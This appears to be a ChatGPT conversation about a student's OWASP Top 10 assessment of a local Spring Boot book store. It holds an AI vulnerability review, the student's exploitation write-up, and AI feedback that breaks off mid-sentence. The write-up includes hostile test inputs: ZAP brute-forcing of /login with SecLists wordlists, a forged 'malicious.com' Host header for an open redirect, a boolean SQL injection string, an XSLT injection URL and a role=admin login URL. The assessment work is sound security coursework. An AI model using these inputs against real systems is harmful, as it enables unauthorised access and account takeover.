Το ChatGPT είπε:
Your Spring Boot Book Store application has several critical OWASP and CWE security vulnerabilities. Here's a categorized breakdown of the issues found, along with references to both OWASP Top 10 (2021) and CWE (Common Weakness Enumeration) standards.

✅ 1. Insecure Authentication / Broken Access Control
❌ Hardcoded Credentials
Location: LoginController.java

Issue: Admin and default customer logins use hardcoded credentials.

Code:

if ("admin".equals(username) && "admin123".equals(password)) { ... }
OWASP: A07:2021 – Identification and Authentication Failures

CWE: CWE-798 – Use of Hard-coded Credentials

Fix: Use database-backed accounts with securely hashed passwords. Never hardcode credentials in code.

❌ No Password Hashing
Location: User entity and registration logic

Issue: Passwords are stored and compared in plain text.

OWASP: A02:2021 – Cryptographic Failures

CWE: CWE-256 – Plaintext Storage of Password

Fix: Use BCrypt (e.g., BCryptPasswordEncoder) for password hashing before storing or validating.

❌ Missing Role-Based Authorization
Issue: The application sets a role in the session but does not restrict routes/actions based on roles.

OWASP: A01:2021 – Broken Access Control

CWE: CWE-285 – Improper Authorization

Fix: Enforce controller-level access control with role checks (manually or via Spring Security).

✅ 2. Session Management Flaws
❌ No Session Timeout or Expiry
Issue: You create sessions for logged-in users but do not configure timeout or expiration.

OWASP: A07:2021 – Identification and Authentication Failures

CWE: CWE-613 – Insufficient Session Expiration

Fix: Set session.setMaxInactiveInterval(...) or configure timeout in application.properties.

❌ No CSRF Protection
Issue: All forms (add, remove, login, register) are vulnerable to CSRF as CSRF tokens are not used.

OWASP: A01:2021 – Broken Access Control

CWE: CWE-352 – Cross-Site Request Forgery (CSRF)

Fix: Enable CSRF protection in Spring or manually implement anti-CSRF tokens in forms.

✅ 3. Injection & Validation Issues
❌ Missing Input Validation on Critical Fields
Examples: username, password, checkoutForm fields (cardNumber, address) are not validated.

OWASP: A03:2021 – Injection

CWE: CWE-20 – Improper Input Validation

Fix: Use @Valid and JSR-380 annotations (@NotBlank, @Size, @Pattern, etc.) and a BindingResult.

❌ SQL Injection Possibility (with custom queries)
While JpaRepository is used properly, if custom queries are added without parameters, it becomes vulnerable.

OWASP: A03:2021 – Injection

CWE: CWE-89 – SQL Injection

Fix: Always use prepared statements or parameterized queries.

✅ 4. Sensitive Data Exposure
❌ Exposed Card Numbers in Plain Text
Location: CheckoutForm

Issue: Card numbers are stored in plain memory without masking/encryption.

OWASP: A02:2021 – Cryptographic Failures

CWE: CWE-311 – Missing Encryption of Sensitive Data

Fix: Don’t handle/store real card data. If needed, use tokenization or secure payment gateways.

✅ 5. Missing Security Headers
Your HTML and controller responses don’t include any HTTP security headers (e.g., X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, Content-Security-Policy).

OWASP: A06:2021 – Vulnerable and Outdated Components

CWE: CWE-693 – Protection Mechanism Failure

Fix: Add a WebSecurityConfigurerAdapter or filter to configure secure headers.

✅ 6. Lack of Input Sanitization (XSS Risk)
Fields like book_name, author_name, username, etc., are rendered directly in the views.

OWASP: A03:2021 – Injection

CWE: CWE-79 – Improper Neutralization of Input During Web Page Generation (XSS)

Fix: Use proper encoding in views and validate/sanitize input. Thymeleaf is safe by default but confirm it's not bypassed.

✅ 7. Information Leakage (Error Handling)
No error handler is present (e.g., global exception handler or 404 page).

OWASP: A05:2021 – Security Misconfiguration

CWE: CWE-209 – Information Exposure Through an Error Message

Fix: Implement @ControllerAdvice with global error handling.

✅ 8. No HTTPS Enforcement
The application has no SSL enforcement or redirect policy.

OWASP: A02:2021 – Cryptographic Failures

CWE: CWE-319 – Cleartext Transmission of Sensitive Information

Fix: Use HTTPS redirection via Spring Security or application server configuration.

✅ 9. Improper Use of HiddenHttpMethodFilter
The filter is enabled, but there is no access restriction or verification logic.

OWASP: A05:2021 – Security Misconfiguration

CWE: CWE-285

Fix: Restrict HTTP method overrides only to authorized users (e.g., admins).

Summary Table
Issue	OWASP	CWE	Fix Summary
Hardcoded admin credentials	A07	CWE-798	Move to DB, remove hardcoded logic
Plain text passwords	A02	CWE-256	Hash using BCrypt
Missing CSRF protection	A01	CWE-352	Enable CSRF tokens
No access control on actions	A01	CWE-285	Add controller method access checks
Session never expires	A07	CWE-613	Set timeout, invalidate correctly
No validation on input	A03	CWE-20	Use @Valid, JSR-380
Card numbers unprotected	A02	CWE-311	Don’t store/process directly
No secure headers	A06	CWE-693	Add HSTS, CSP, etc.
No XSS protection	A03	CWE-79	Sanitize/render input safely
No HTTPS	A02	CWE-319	Enforce HTTPS, secure cookies
Info leakage on errors	A05	CWE-209	Add global exception handling
Recommendations
✅ Use Spring Security (even with basic configuration) to eliminate 60% of these issues.

✅ Hash passwords using BCryptPasswordEncoder.

✅ Enable CSRF protection and secure headers.

✅ Add validation (@Valid, @Size, @Pattern) for all user inputs.

✅ Introduce proper access control for admin/customer functionality.

✅ Never store or process card data directly.

Would you like me to generate a Spring Security starter configuration or secure registration/login with BCrypt and role-based restrictions?

Exploitations
The discovery of vulnerabilities in the Shop applications, has 4 steps approach, and combines the following techniques:
1.	Manual Scan: Testing and running the application on http://localhost:8080), manual inspection of code in IntelliJ and on MySQL database. It uses also the OWASP ZAP in manual mode, such as fuzzing, response analysis, request interception).
2.	Snyk Scan: Analyse the Maven project to dependencies for vulnerabilities (CVE) that affect the supply chain of dependencies. This helps to detect security issues from external libraries and components.
3.	Automated-Authenticated Scan: Used in automated mode on ZAP to run full scans, spider to application and test authenticated areas using valid session cookies. We combine this methodology, with authenticated ZAP scan.
4.	LLM Support: Use of ChatGPT for missing vulnerabilities.
Vulnerabilities
The following vulnerabilities are identified in the present Shop application. They are presented in order of importance (from most critical to least critical), following the top 10 OWASP 20212 vulnerability categories that are published at https://owasp.org/Top10/ . Only those vulnerabilities that have also been exploited by the author of this assignment are being shown. 
A01:2021 Broken Access Control
CWE-639: Authorization Bypass Through User-Control Key
The application implements access control based on roles, and distinguishes between admin and customer. Admin functions like /delete/{id}, are strictly intended for users with admin role. Although again, error page is missing and attacker can exploit sensitive data, by deliberately making such authorization bypass requests.
 
SOURCE CODE LOCATION
BookController.java: Line: 94 (@DeleteMapping(“/delete/{id}”) public String deleteBook (@PathVariable Long id, HttpSession session)) includes an if (!"admin".equals(session.getAttribute("role"))). Method is annotated with DeleteMapping, and expects an HTTP DELETE. Same admin check happens with save book and new book. This led to trying to execute the method, leaving space for potential backdoors or advanced exploitation (similarly to using advanced SQL questions, but here we could use to view the error whitelabel error page). The appropriate annotation that should be applied on all admin control method is @PreAuthorize(“hasRole(‘ADMIN’)”). Also each controller method, should have implementing a BookNotFoundException.
EXPLOITATION – MANUAL SCAN
Manul exploitation: Running localhost:8080
(Attempted: Although there was not a clear exploitation in a sense of bypassing, the results were not absolutely satisfying)
An attempt was made to exploit any vulnerability when using a use with lower privilege (e.g. a user jim/jim with JSESSIONID=555DBD6EA2B9812A27EFBCE7587EBCA7) to perform administrative action (like deleting an existing book with id 4) without authorization. The attempt was by using  POST /delete/{id}, including _method=delete in the body, that was previously been sent by an admin, but now with the user’s session id. This resulted in returning a Whitelabel error page, that was saying that method POST is not supported.
In general: hasRole(‘ADMIN’): Checks if the user has role name ADMIN.
@PreAuthorize: Is used to define an authorization expression before the method runs, if method is false, execution does not occur. It integrates into Spring requests lifecycle. When user sends a POST /delete , with JSESSIONID of a user, Spring security basically intercepts it, returning a 403 Forbidden response, instead of doing something like redirecting to login or to a Whitelabel error page.
CWE-352: Cross-Site Request Forgery (CSRF)
Application is vulnerable to CSRF attacks, and it does not implement anti CSRF tokens for its actions that change their state e.g. delete books. Even the SameSite (discussed above on the CWE-1275) could offer some limited protection, but it is not sufficient.
SOURCE CODE LOCATION
controller.BookController.java: The deleteBook method on Line 93 and other site changing methods like newBook or updateBook, do not include any logic to generate unpredictable CSRF tokens.
addBook.html, editBook.html: They do not have include hidden input fields for CSRF tokens e.g.
<input type=”hidden” name=”_csrf” th=value=”{_csrf.token}” /> 
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
OWASP ZAP automated scan detected this CWE, fir many URLs on n this application e.g. http://localhost:8080/login. There is no known anti-CSRF token in the HTML forms. If the browsers uses victim’s session cookie JSESSIONID, the request will be redirected at the application’s domain, even if sent from another domain,
 
CWE-1275: Sensitive Cookie with Improper SameSite Attribute.
 
Application utilizes a JSESSIONID cookies for the session management. When observed in browser developer tools, this session cookie, did not define the SameSite attribute. This attribute works on new browsers to protect again Cross Site Request Forgery attacks when cookies are sent with cross site requests. Absense of this means that browser’s default behaviours will be used here, and this is less secure and also differently performed by one browser to another.
SOURCE CODE LOCATION
server.servlet.session.cookie.same-site is missing from application.properties.
EXPLOITATION – MANUAL SCAN
Old browsers could send cross site requests to our application, with their session cookie. Unauthorized action can happen when no CSRF tokens are involved. This can happen when browser includes the JSESSIONID cookie in a cross-site content (e.g. we could use malicious_csrf.html webpage and have the same results).
 
 
A02:2021 Cryptographic Failures
CWE-319: Cleartext Transmission of Sensitive Information
This application operates entirely on HTTP which is not encrypted (http://localhost:8080). HTTPS uses transport layer security providing security to the exchange of data between user and server. HTTP sends transmitted data on the network in plain text, such as usernames, passwords or even card credentials. Also the database has not TLS encryption too.
SOURCE CODE LOCATION
application.properties: There is no server.ssl for client server communication, or useSSL= true (or REQUIRED), in the spring.datasource.url for database encryption.
EXPLOITATION – MANUAL SCAN
If an attacker is using the same network e.g. public Wi-Fi or router, with tools like OWASP ZAP or WhireShark, it is easy to exploit sensitive data in plain text. As shown in the picture below, login data are fully exposed. This causes severe exploitation of privacy, gives room for fraud transactions, or leak of sensitive information. Lack of database encryption is even a more severe vulnerability because database server itself can be compromised.
 
CWE-312: ClearText Storage of Sensitive Information
Although in application.properties we are not storing data, but rather creating new database tables each time,  spring.jpa.hibernate.ddl-auto = create, the customer passwords are stored in plain text in the database without any encoding or salting.
SOURCE CODE LOCATION
•	model.User.java: The password field in Line 14, it is defined as String and in Line 23 there is no encryption or salting applied.
•	repository.UserRepository.java: The JpaRepository save method is not processing the password before saving it.
•	controller.RegistrationController.java: userRepository(user) saves the user details (including the password) in plain text on the database.
EXPLOITATION – MANUAL SCAN
If a user has access to the database, by sql injection or otherwise, there will be immediate access to the database plaintext information. This allows straightforward takeover of the account . The observation of registered user jim/jim directly from the database confirms this vulnerability.
 
CWE-208: Observable Timing Discrepancy (Timing attack)
*Also Is linked to CWE-256: Unprotected Storage of Credentials
The application is vulnerable to timing attacks. When we try to compare the password that is hard coded with the one that is sent, String.equals() is used. The method an exit earlier if the a mismatch is found at the begging of the strings, so time it takes to compare passwords is not constant. An attacker may het advantage of this, and find information of the password.
SOURCE CODE LOCATION
Controller.LoginController.java: The timing vulnerability exists in password comparison in the lines:
Line 40: if ("admin".equals(username) && "admin123".equals(password)) {
Line 47: if ("customer".equals(username) && "cust123".equals(password)) {
Line 55: if (user.getPassword().equals(password)) {
EXPLOITATION – SNYK SCAN
The attacker can use brute-force or dictionary attacks to measure the response time of each login attempt. If the attempts that match more characters take longer to process, the attacker may have a clue of how long the value may be. Although such attacks are difficult to perform, they weaken the authentication credibility. A more secure comparison is using java.security.MessageDigest.isEqual as Snyk suggest that should execute in constant times, regardless the input.
 
CWE-598: Information Disclosure (Session ID in URL ReWrite)
URL rewriting is used to track user session and it embeds the JSESSIONID into the URL path (e.g. http://localhost:8080/login;jsessionid=A8C13495C917EC964D1708C35 as the above picture shows). This method leads to disclosure of sensitive session data.
SOURCE CODE LOCATION
It is a typical behaviour of the servlet containers like Tomcat that Spring Boot uses, when cookies are ignored.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
OWASP ZAP automated scan exposed this vulnerability (;jsessionid=A8C13495C917EC964D1708C35). The presence of session ID on URL exposes many “obvious” risks to the application (e.g. if the URL is shared the session id is directly exposed).

 
A03:2021 Injection
CWE-20: Improper Input Validation (Email Uniqueness)
The application fails to validate for unique email address provided during registration of a new customer. This allows distinct user account to be associated with same email, leading to violation of integrity of data.
 
SOURCE CODE LOCATION
•	controller.RegistrationController.java: The registerUser method (Line 26) only checks for the uniqueness of the username userRepository.findByUsername(use.getUsername()), but does not perform any validation to ensure if the email is unique, before saving the User in the database.
•	Repository.UserRepository.java: This interface is missing a method to find users by email, for example Optional<User> findByEmail(String email) for making the check.The attacker can register many accounts using the same email address, creating ambiguity when the user tries to identify, and also can cause problems when accounts tries to recover (e.g. password reset). The ability to successfully have registered as jim and jim2, and both use a@a.com demonstrates this lack of validity.
EXPLOITATION – MANUAL SCAN
The attacker can exploit the application by a manual registration.
•	First user account is registered successfully (username jim and email: a@a.com)
•	A second account is registered successfully (username: jim2 but uses the same email a@a.com)
 
The same exploitation was found again later with OWASP ZAP automated scan tools.
 
CWE-601: URL Redirection to Untrusted Site (“Open Redirect”)
Application is vulnerable to URL redirection to untrusted Site that is also known as Open Redirect. This vulnerability happens when  application redirects users to URK that is made from untrusted input (HTTP changed Host or URL parameters) and use no validation, allowing the attacker to redirect the target,
SOURCE CODE LOCATION
It is the Sprint Boot framework default handling of redirect with untrusted HTTP headers. When methods in the controllers like in BookController newBook Line 54, or updateBook Line 83, or deleteBook Line 93 or in CartController addToCart Line 33 or processCheckout Line 72, return a string e.g. redirect:/bool, the Spring book makes a full redirection using Host header. If the header is not validated, it can be manipulated.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
Attacker sends a GET request http://localhost:8080/books with header malicious.com
Application processes the requests and decides to redirect to http://localhost:8080/books 
However instead of sending it to the location localhost:8080 , the application makes a Location header of 302 Found and makes a changed Host header, so the website is http://malicious.com/books .
This can be used to phishing attacks (to redirect to a fake login page), or bypassing security if the victim’s cookie is sent too. ZAP automated tool confirms this on the URLS /books, /cart/add, delete/1 and /save.
 

CWE-89: Improper Neutralization of Special Elements used in an SQL Command(SQL Injection)
This application might be vulnerable to SQL injection, and this could allow the attacker to execute SQL queries through manipulated input. Although testing manually such queries failed in all attempts, suggesting that this might be a false ZAP automated scan alarm. In a successful case, attacker could have access to the database and harm the system.
SOURCE CODE LOCATION
Spring Data JPA repositories e.g.  findAll(), findById(), save(), delete(), findByUsername(), that use prepared statements in general.
•	controller.BookController.java (GET /books, POST /save, DELETE /delete/{id})
•	controller. LogincController.java (POST /login)
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
OWASP ZAP’s active scan detected SQL injection on many URLs and parameters:
URLs:
http://localhost:8080/books, http://localhost:8080/cart/add, http://localhost:8080/delete/1, http://localhost:8080/login, http://localhost:8080/save
HTTP HEADERS: Host, User-Agent and Refferer headers, URL paths or Form parameters (jsessionid, username)
Example for Login: http://localhost:8080/login , ZAP successfully manipulated Boolean conditions jsessionid=…%26username=admin%26password=admin%261%3D1, This means that payloads like 1=11 or 1=2 into jsessionid or username parameters could cause a detectable difference in the application response, as we learned in the SQL injection advanced section of WebGoat. Although many of these alarms are detected from ZAP as critical, it might be a false alarm, because Spring JPA is/might be safe enough from SQL injections.
 
CWE-120: Buffer Overflow
Buffer overflow is when program tries to write data to buffer that is larger than the memory that is allocated. Zap tries to write a huge parameter to the memory that successfully caused buffer overflow.
SOURCE CODE LOCATION
POST http://localhost:8080/books for adding, registering or editing books.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
OWASP ZAP automated scan detected Buffer Overflow by injecting huge size input fields. These error indicate:
Errors of this type, lead to unexpected execution.
Script connection stopped and threw 500 Internal Server Error. Such an attack caused denial of service and may disrupt service availability.
 
CWE-91: XML Injection (XLST Injection)
XLST injection is a type of XML injection when user-controlled input XLST is used. This kind of injection may allow the attacker to execute code on the server by using this kind of XML.
SOURCE CODE LOCATION
Apache Tomcat uses/may use XSLT processor. No direct use of XSLT from user.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
OWASP ZAP automated scan deleted this vulnerability. It is mostly an alert and not a direct exploitation. URLs like this: http://localhost:8080/%3Cxsl:value-of%20select=%22system-property('xsl:vendor')%22%2F%3E could cause the server to be exploited or trigger an error. This is a generic finding, most likely a false positive, because this application does not use any XSLT user input. This application instead uses Thymeleaf which is HTML  based rather than XSLT.
 
A04:2021 Insecure Design
CWE-307: Improper Restriction of Excessive Authentication Attempts
Application lacks the ability to perform security controls to prevent or mitigate brute-force attacks. This mechanism should especially work on login functionality and in every request, to prevent DDOS. Mechanisms such as rate limiting , account locks after many failed attempts, or CAPTCHA challenges to determine if the client is driven by a robot or a human.
SOURCE CODE LOCATION
•	Controller.LoginController.java: The login method at Line 32, makes authentication of the user, without making any checks for suspicious activity (e.g numbers of failed attempts from an IP within a certain interarrival time). This control is missing any business logic. 
This vulnerability is one of the hardest to solve, because there are too many ways to harm the servers. Use of Cloudfare is one of the most effective solutions for this vulnerability, it offers edge-level brute force attack protections. WAF rules, rate limiting, bot detection, geo-blocking and CAPTCHA are the most crucial and happen before the request reaches the application layer. For example, brute force tools of ZAP cannot can be blocked easily with Cloudfare.
EXPLOITATION – MANUAL SCAN
Combining ZAP fuzzer and known username/passwords or by brute forcing the session id cookie, we can send a large number of username/passwords to the /login. As demonstrated on the  CWE-798 picture of brute-force with the ZAP fuzzer (that we found a successful combination of role/username and password), the application processes the requests without any delays, account locks or CAPTCHA challenges. 
    
CWE-654: Reliance on a Single Factor Decision
This application relies only on a single authentication (user and password) for user login. There is no multi factor authentication implemented, so the authentication is based solely in one piece of evidence.
SOURCE CODE LOCATION
Controller.LoginController.java: The login controller (Line 32) only validates username and password, without any concerns about secondary authentication factors.
EXPLOITATION – MANUAL SCAN
User accounts are highly vulnerable if credentials are stolen from phishing or brute force attacks (demonstrated on CWE-307 that with brute force we joined as admin). The attacker can impersonate to any unauthorized actions without any additional verification. 
A05:2021 Security Misconfiguration
CWE-756: Missing Error Page
 
“Book Sore Application” does not have neither error page, not any error page configuration. Thus, when error occurs (e.g. unsupported HTTP method used), then the Spring Boot default ‘Whitelabel Error Page’ is displayed. This page has sensitive information and provides details about the application structure and exact place of the failure.
SOURCE CODE LOCATION
This vulnerability happens because there is no handling on application.properties file (e.g. server.error.whitelabel.enabled=false) and custom error views for example an error.html page, or a catholic exception handling like @ControllerAdvice class) to filter error messages for the user.
EXPLOITATION – MANUAL SCAN
An attacker can trigger error page by sending requests with unsupported HTTP methods to existing endpoints. For example, using GET to /delete/{id} which uses specifically a DELETE (@DeleteMapping("/delete/{id}")). The leaked stack provides intelligence and sensitive data to the attacker.
CWE-250: Execution with Unnecessary Privileges
Application connects to MySQL with root user account. Root user has typically full admin privileges iver the entire MySQL server, which is far more than the privileges required by this application that uses only one schema.
SOURCE CODE LOCATION
application.properties: spring.datasource.username=root 
EXPLOITATION – MANUAL SCAN
Although this spring boot project does not seem to have clear exploitation to sql injection . If a developer adds on the project @Query annotation  with native SQL or EntityManager.createNativeQuery() or JdbcTemplate with unsanitized input, there can be an SQL injection. Having root privileges makes the case even worse. The level of access goes beyond our schema, and lets the attacker:
•	Access, modify or delete data in other databases on the same MySQL server.
•	Create new databases.
•	Execute highly privileges methods, such as LOAD DATA INFILE.

 
CWE-693: Protection Mechanism Failure (Content Policy Security Not Set)
This application does not implement Content Security Policy (CSP) header, which could help to mitigate the client side attacks, e.g. Cross Site Scripting or data injection. Defining which set of content is allowed (scripts, images) CSP browser blocks the resource loading. Absence of this happens, loads all content, thus more surface is available for vulnerability.
SOURCE CODE LOCATION
Class SecurityConfiguration  is missing that filter the security filter chain and provide any server configurations.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
Direct exploitation couldn’t be performed because the application itself is small enough to provide more functionality, e.g. user uploading a photo. This exploitation should have been fixed because it provides a vulnerability that is prone to be exploited. The ZAP alert is an evidence of this vulnerability.

 
CWE-1021: Improper Restriction of Rendered UI Layers (Clickjacking)
This application is vulnerable to clickjacking because it does not implement X-Frame-Options HTTP header. Those headers tell the browser whether a page can be loaded from an iframe or not.
SOURCE CODE LOCATION
Class SecurityConfiguration is missing that filter the security filter chain HttpSecurity configuration for X-Frame-Options.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN

 
 
 
CWE-550: Application Error Disclosure
*Also Is linked to CWE-1295: Information Disclosure (Debug Error Messages)
As discussed on the CWE-756, this application is missing the error page and is configured to show the warning messages to the client. For the same reasons as in CWE-756, this raises a vulnerability issue.
SOURCE CODE LOCATION
The application lacks a global error handling mechanism such as @ControllerAdive, or custom error page for all 500 errors), to sanitize these sensitive Java message to the client.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
ZAP automated scan detected this vulnerability when tried to access this example page: http://localhost:8080/save , that triggered a 500 internal error.
 
 
 
CWE-16: Configuration (GET for POST)
It is not a direct weakness, but it a misconfiguration that may lead the framework or the application vulnerable because of future changes. Attacker could easily login to website using this link: http://localhost:8080/login?password=jim&role=admin&username=jim
SOURCE CODE LOCATION
controller.LoginController.java: Line 25 that uses GET for login action.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
OWASP ZAP successfully sent a GET http://localhost:8080/login?password=jim&role=admin&username=jim .  This request was originally observed as a POST and is also accepted as a GET.
 
CWE-615: Informational Disclosure (Suspicious Comments)
Application has comments on it’s HTML RESPONSES. Comments are not malicious, but they might disclose information about the application.
SOURCE CODE LOCATION
login.html: Comments such as <!-- Admin Login -->
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
Although OWASP automated scan discovered this vulnerability, it is easily visible by inspecting the elements of the html (e.g. on Mozilla right click -> Inspect (Q)).
 
 
A06:2021 Vulnerable and Outdated Components
CWE-190: Integer Overflow or Wraparound (via Tomcat Embed Core)
This application uses some third-party libraries that have some known security vulnerabilities and are identified from static analysis. The vulnerable components introduce security risks though their inherited flaws. There is an integer flaw or wraparound issue. This flaw may affect file uploads on servelet containers. The attacker could make malicious form-data requests with Content-Length headers, that can lead to integer overflow vulnerabilities, bypassing file size restrictions and cause memory issues. Snyk suggests to update org.apache.tomcat.embed:tomcat-embed-core  to version 9.0.107, 10.1.43, 11.0.9 or higher.
SOURCE CODE LOCATION
pom.xml: org.apache.tomcat.embed:tomcat-embed-core library is of version 10.1.42, and is a transitive dependency of org.sringframework.boot:spring-book-starter-web@3.5.3
EXPLOITATION – SNYK SCAN – CVE-2025-30705 HIGH SEVERITY
There was no file upload functionality on this project, thus direct exploitation couldn’t be done. If there was such a functionality, this could be exploited by bypassing size limits and denial of service. The vulnerability ius present though and needs attention.
 
CWE-770: Allocation of Resources Without Limits or Throttling (via Tomcat Embed Core)
The vulnerability us in org.apache.tomcat.embed:tomcat-embed-core library and is related to the “Allocating of Resources Without Limits or Throttling” – CVE-2025-53506. This affects HTTP/2 multiplexing feature, where the attacker can make exhaustion of resources when creating HTTP/2 streams with TCP connection, that could lead to denial of service.
SOURCE CODE LOCATION
pom.xml: org.apache.tomcat.embed:tomcat-embed-core library is of version 10.1.42, and is a transitive dependency of org.sringframework.boot:spring-book-starter-web@3.5.3
EXPLOITATION – SNYK SCAN – CVE-2025-53506 HIGH SEVERITY
OWASP ZAP is a general-purpose analysis tool and exploitation was unsuccessful. Nature of HTTP/2 protocol requires tools for making HTTP/2 frames and application that work on HTTP/2. Also observing resource exhaustion requires server-side monitoring tools. However Snyak isentifies this vulnerability and confirms its presence in the dependencies. So, if an attacker can trigger this vulnerability, it could cause exhaustion of resources and the application will be unable to serve legitimate users, and will achieve denial of service. 
 

CWE-226: Incorrect Default Permissions (via MySQL Connector/J)
Exists in com.mysql:mysql-connector-j library, version 9.2.0.  This means that the library’s default configuration may expose the sensitive data or allow unauthorized actions if settings are not explicitly reconfigured.
SOURCE CODE LOCATION
pom.xml: <dependency><groupId>com.mysql</groupId><artificialId>mysql-connector-j </artificialId></dependency> 
EXPLOITATION – SNYK SCAN – CVE-2025-30706 HIGH SEVERITY
To exploit such flows in database connector library, needs a specific low-level interaction a unique set of circumstances. While the vulnerable library is there, the application’s usage of connection with Spring Dara JPA may not trigger the specific code paths. However, the flaw identified by Snyk and this confirms that there is a potential risk of using this library.
 

A07:2021 Identification and Authentication Failures
CWE-798: Use of hard coded Credentials 
*Also Is linked to CWE-259: Use of hard coded Password
 
Application contains sensitive user credentials (both admin and customer roles) in its source code.  If the attacker gains access to the source code, the credentials can be easily discovered, and this could lead to unauthorized access. This vulnerability was found and exploited manually and then been discovered by snyk tool also, providing also probable fixed using System.getenv instead of hard coded strings.
SOURCE CODE LOCATION
controller.LoginController.java: Hard coded admin credentials username=”admin”, password= “admin123” that are found on Line 40 and the hard coded customer username=”customer”, password=”cust123”, that can be found on Line 47.

EXPLOITATION – MANUAL SCAN AND SNYK
•	The attacker can used fuzzer to brute-force the /login endpoint (cluster bomb attack).
•	The POST http://localhost:8080/login was targeted, with role parameter as a fixed string “admin”.
•	For username and password, payloads were loaded from the SecLists repository https://github.com/danielmiessler/SecLists , specifically top-usernames-shortlist.txt for the usernames and Most-Popular-Letter-Passes.txt (modified) for the passwords.
•	Analysis of fuzzer results in ZAP, revealed 2 distinct response types: 
1.	Failed attempts: 200 OK status, body of 2162 bytes for login.html page, which means login failure.
2.	Successful attempts: 302 found status and size resp. body of 0 bytes. This pattern redirects to main page (/), and has no response body during the redirect.
Payload of username=admin and password=admin123 from the fuzzed lists were identified as successful. This showcase that the brute force attack successfully identified a valid admin username and password.
 
CWE-521: Weak Password Requitements and CWE: Use of Weak Credentials
Application does not force strong password during registration of user. This allows users to choose weak passwords, which make user accounts susceptible for brute force or attacks using dictionaries. The fact that username jim and password jim was acceptable, and the confirmation on mySQL database confirms this.
   
SOURCE CODE LOCATION
•	model.User.java: The password field (Line 14) does not have any validation annotations @Size, @Patterns, to force rules.
•	Controller.RegistrationController.java: The registerUser (Line 24) saves the User object without confirming any server-side password strength validation.
•	EXPLOITATION – MANUAL SCAN
The attacker can register new accounts with easy passwords, or target a any existed account with dictionary attacks or with brute force. The success of such registration with username jim and password jim demonstrates the vulnerability.

Ενημερωμένη αποθηκευμένη μνήμη
Your assignment already covers a thorough and impressive breadth of OWASP Top 10 (2021) vulnerabilities, backed with CWE mappings, exploitation evidence, and technical locations. However, based on a meticulous analysis of your write-up and OWASP 2021 categories, here are a few areas you could expand or strengthen to fully align your assessment with the OWASP Top 10 (2021):

✅ OWASP Top 10 – Full Coverage Checklist
✅ A01:2021 – Broken Access Control ✔️
Covered well. You’ve identified:

Missing @PreAuthorize

Bypass attempts via manipulated methods (e.g. _method=delete)

Session-based role checks only

✅ A02:2021 – Cryptographic Failures ✔️
You’ve nailed:

No HTTPS (CWE-319)

Plaintext password storage (CWE-312)

TLS not enforced in DB connections

Optional extra (minor):

Passwords are also exposed during authentication (CWE-522) since no masking/encoding is used in transmission.

✅ A03:2021 – Injection ✔️
Covered several types:

SQL injection attempts (CWE-89)

Open Redirect (CWE-601)

XML injection alert (CWE-91)

Email uniqueness violation (CWE-20)

Potential additions:

Command Injection / Expression Language Injection: Even if not applicable, note that your current app doesn't use user-controlled EL (SpEL, Thymeleaf inline scripts, etc.), which could be good to mention explicitly as not applicable.

✅ A04:2021 – Insecure Design ✔️
Great points made:

No brute-force mitigation (CWE-307)

No MFA (CWE-654)

Optional enhancements:

You could briefly comment on the lack of secure design patterns or misuse of insecure design paradigms, such as reliance on hardcoded admin logic, or the role logic being handled only at the controller level (instead of centralized service-level validation).

✅ A05:2021 – Security Misconfiguration ✔️
Strong coverage:

Missing error page (CWE-756, CWE-550)

Root DB access (CWE-250)

Missing CSP, X-Frame-Options, error disclosure

Optional additions:

Mention unrestricted HTTP methods. While you note GET-for-POST (CWE-16), consider mentioning lack of HTTP method restrictions on endpoints or server-level config.

Consider enforcing strict MIME type checking via X-Content-Type-Options: nosniff header.

✅ A06:2021 – Vulnerable and Outdated Components ✔️
Perfectly analyzed with:

Tomcat vulnerabilities (CWE-190, CWE-770)

MySQL connector (CWE-226)

Snyk verification

✅ Nothing missing.

✅ A07:2021 – Identification and Authentication Failures ✔️
Clearly covered:

Hardcoded credentials (CWE-798)

Weak password policy (CWE-521)

Timing attacks (CWE-208)

Small improvement:

You could mention that password reset functionality is absent, or not secured, if implemented later. Also highlight that brute-force login attack succeeds due to lack of rate limiting or CAPTCHA.

🔶 A08:2021 – Software and Data Integrity Failures 🔶
Missing or under-covered.

This category relates to CI/CD pipelines, unsigned/untested software updates, dependency injection, deserialization, and similar.

Suggestions to mention:

Your project doesn’t verify dependency integrity (e.g., no checksum validation or pinned versions).

spring-boot-devtools is included and should be removed from production builds.

<artifactId>spring-boot-devtools</artifactId>
<scope>runtime</scope>
<optional>true</optional>
No use of secure deployment procedures like signed artifacts, integrity checks, or restricted maven proxy registries.

➡️ CWE mappings to cite:

CWE-494: Download of Code Without Integrity Check

CWE-829: Inclusion of Functionality from Untrusted Control Sphere

✅ A09:2021 – Security Logging and Monitoring Failures ✔️
Currently not discussed.

Suggestion to mention:

Application does not implement audit logging for:

Login attempts (success/failure)

Admin actions (book edits/deletes)

Checkout actions

No log sanitization or central monitoring

➡️ CWE mappings to cite:

CWE-778: Insufficient Logging

CWE-117: Improper Output Neutralization for Logs

✅ A10:2021 – Server-Side Request Forgery (SSRF) ✅
Correctly omitted. This does not apply to your project because:

No server-to-server calls using user-supplied URLs exist

No use of RestTemplate or file upload with external fetch

Just mention its absence for completeness.

🔍 Summary Table: What's Missing
OWASP 2021 ID	Status	Notes
A01 – Broken Access Control	✅	Covered with role bypass, session ID testing
A02 – Cryptographic Failures	✅	Plaintext transmission, storage
A03 – Injection	✅	SQLi, Open Redirect, XML injection
A04 – Insecure Design	✅	Brute force, no MFA
A05 – Security Misconfiguration	✅	Root DB access, no error page, missing headers
A06 – Vulnerable/Outdated Components	✅	Snyk verified, Tomcat/MySQL issues
A07 – Auth Failures	✅	Hardcoded creds, weak passwords
A08 – Software/Data Integrity	❌	Missing; add notes on devtools, unsigned updates
A09 – Logging & Monitoring	⚠️ Not mentioned	Add logging coverage, missing audit trail
A10 – SSRF	✅ (N/A)	No server-side calls from user input (correctly omitted)
✅ Final Suggestion for Report
To maximize the assignment score:

